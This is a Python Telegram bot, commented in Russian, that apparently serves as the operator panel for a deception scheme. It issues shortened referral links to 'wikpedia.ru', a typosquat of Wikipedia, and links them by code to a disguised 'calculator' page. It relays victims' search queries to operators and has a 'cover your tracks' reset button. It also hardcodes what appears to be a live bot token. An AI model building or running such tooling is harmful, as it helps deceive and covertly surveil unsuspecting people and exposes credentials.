from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
import logging
import aiohttp

BOT_TOKEN = "7953140297:AAGwWVx3zwmo-9MbQ-UUU1764nljCxuncQU"
BASE_SITE_URL = "https://wikpedia.ru"
AUTHORIZED_USERS_FILE = "authorized_users.txt"
ADMIN_ID = 132588075  # Твой ID

logging.basicConfig(level=logging.INFO)

# Загрузка разрешённых пользователей из файла
def load_authorized_users(filename=AUTHORIZED_USERS_FILE):
    try:
        with open(filename, "r") as f:
            return {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        logging.warning(f"{filename} не найден, список разрешённых пользователей пуст.")
        return set()

AUTHORIZED_USERS = load_authorized_users()


async def allow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 У вас нет прав для этой команды.")
        return
    
    if not context.args:
        await update.message.reply_text("Использование: /allow <user_id>")
        return
    
    try:
        user_id_to_add = int(context.args[0])
    except ValueError:
        await update.message.reply_text("ID должен быть числом.")
        return
    
    # Добавляем в файл, если ещё нет
    if user_id_to_add in AUTHORIZED_USERS:
        await update.message.reply_text(f"Пользователь {user_id_to_add} уже в списке.")
        return
    
    with open(AUTHORIZED_USERS_FILE, "a") as f:
        f.write(f"{user_id_to_add}\n")
    
    AUTHORIZED_USERS.add(user_id_to_add)
    await update.message.reply_text(f"Пользователь {user_id_to_add} добавлен в список разрешённых.")


# Проверка доступа
async def check_access(update: Update):
    user_id = update.effective_user.id
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("🚫 У вас нет доступа к боту.")
        return False
    return True

# Главное меню
async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, text="📲 Главное меню:"):
    if not await check_access(update):
        return
    keyboard = [
        [KeyboardButton("🔗 Моя ссылка"), KeyboardButton("🔄 Концы в воду")],
        [KeyboardButton("🔢 Ввести код"), KeyboardButton("🧮 Калькулятор")],
	[KeyboardButton("🆔 Мой ID")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(text, reply_markup=reply_markup)

# Команда /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return
    await show_main_menu(update, context)


async def shorten_url(long_url: str) -> str:
    api_url = f"https://clck.ru/--?url={long_url}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as resp:
                if resp.status == 200:
                    short_url = await resp.text()
                    if short_url.startswith("http"):
                        return short_url.strip()
                    else:
                        logging.error(f"[SHORTEN_URL] Неожиданный ответ от clck.ru: {short_url}")
                else:
                    logging.error(f"[SHORTEN_URL] Ошибка HTTP {resp.status} при запросе clck.ru")
    except Exception as e:
        logging.error(f"[SHORTEN_URL] Исключение при сокращении URL: {e}")
    return long_url  # fallback, если что-то пошло не так


# Обработка кнопок меню
async def handle_menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return
    text = update.message.text

    if text == "🔗 Моя ссылка":
        user_id = update.effective_user.id
        ref_link = f"{BASE_SITE_URL}?ref={user_id}"
        short_link = await shorten_url(ref_link)

        await update.message.reply_text(
            f"🔗 Ваша ссылка:\n{short_link}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🌐 Перейти", url=short_link)]
            ])
        )


    elif text == "🔄 Концы в воду":
        user_id = update.effective_user.id
        async with aiohttp.ClientSession() as session:
            check_url = f"{BASE_SITE_URL}/check_reset_key?ref={user_id}"
            async with session.get(check_url) as resp:
                if resp.status != 200:
                    await update.message.reply_text("⚠️ Ошибка проверки состояния.")
                    return
                data = await resp.json()
                if not data.get('exists'):
                    await update.message.reply_text("❌ Нечего удалять")
                    return

            async with session.get(f"{BASE_SITE_URL}/trigger_reset?ref={user_id}") as resp:
                if resp.status == 200:
                    await update.message.reply_text("✅ Момент...")
                else:
                    await update.message.reply_text("⚠️ Не удалось вызвать сброс")

    elif text == "🔢 Ввести код":
        context.user_data["awaiting_code"] = True
        await update.message.reply_text("🔢 Введите 4-значный код:")


    elif text == "🆔 Мой ID":
    	user_id = update.effective_user.id
    	await update.message.reply_text(f"🆔 Ваш Telegram ID: `{user_id}`", parse_mode="Markdown")


    elif text == "🧮 Калькулятор":
    	user_id = update.effective_user.id
    	link = f"wikicounter.ru/calculator?ref={user_id}"
    	await update.message.reply_text(
        	"🧮 Ваш калькулятор:",
        	reply_markup=InlineKeyboardMarkup([
            		[InlineKeyboardButton("Открыть калькулятор", url=link)]
        	])
    	)


# Обработка ввода кода
async def handle_code_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    # Если не ждём код — игнорируем
    if not context.user_data.get("awaiting_code"):
        return

    text = update.message.text

    # Проверка формата кода
    if not text.isdigit() or len(text) != 4:
        await update.message.reply_text("❌ Введите корректный 4-значный код.")
        return

    user_id = update.effective_user.id
    ref_link = f"{BASE_SITE_URL}?ref={user_id}"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                "https://wikicounter.ru/update_code",
                json={"code": text, "new_url": ref_link}
            ) as resp:
                data = await resp.json()
                if data.get("status") == "success":
                    await update.message.reply_text("✅ Код найден, устанавливаем связь...")
                else:
                    await update.message.reply_text("❌ Код не найден.")
    except Exception as e:
        logging.error(f"Error updating code: {e}")
        await update.message.reply_text("⚠️ Произошла ошибка, попробуйте позже")

    context.user_data["awaiting_code"] = False


# Логи с кнопкой сброса
async def send_log(context: ContextTypes.DEFAULT_TYPE, user_id: int, query_text: str):
    await context.bot.send_message(
        chat_id=user_id,
        text=f"🔔 Новый поиск!\nЗапрос: {query_text}",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Сбросить", callback_data=f"reset_user_{user_id}")]
        ])
    )


def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Команды
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", show_main_menu))
    
    app.add_handler(CommandHandler("allow", allow_user))

    # Обработчики сообщений (важен порядок!)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Regex(r'^(🔗 Моя ссылка|🔄 Концы в воду|🔢 Ввести код|🧮 Калькулятор|🆔 Мой ID)$')
, handle_menu_buttons))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code_input))
    
    app.run_polling()

if __name__ == "__main__":
    main()


